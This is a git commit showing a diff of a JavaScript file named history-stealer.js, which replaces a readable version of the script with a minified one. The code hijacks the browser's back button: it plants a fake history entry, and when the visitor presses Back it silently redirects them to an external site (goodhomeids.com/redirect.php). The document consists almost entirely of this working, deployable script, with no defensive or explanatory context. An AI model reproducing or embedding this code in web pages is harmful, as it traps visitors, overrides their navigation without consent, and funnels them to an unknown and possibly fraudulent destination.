f7ee657a8df8e73441e6a92b55d704b2f9ef17a7
darylfarahi <daryl30011996@gmail.com>
2019-06-19 09:12:08 +0700

    Update history-stealer.js

--- history-stealer.js
+++ history-stealer.js
@@ -1,13 +1,1 @@
-(function(window, location) {
-history.replaceState(null, document.title, location.pathname+"#!/history");
-history.pushState(null, document.title, location.pathname);
-
-window.addEventListener("popstate", function() {
-  if(location.hash === "#!/history") {
-    history.replaceState(null, document.title, location.pathname);
-    setTimeout(function(){
-      location.replace("https://goodhomeids.com/redirect.php");
-    },0);
-  }
-}, false);
-}(window, location));
+!function(t,e){history.replaceState(null,document.title,e.pathname+"#!/history"),history.pushState(null,document.title,e.pathname),t.addEventListener("popstate",function(){"#!/history"===e.hash&&(history.replaceState(null,document.title,e.pathname),setTimeout(function(){e.replace("https://goodhomeids.com/redirect.php")},0))},!1)}(window,location);
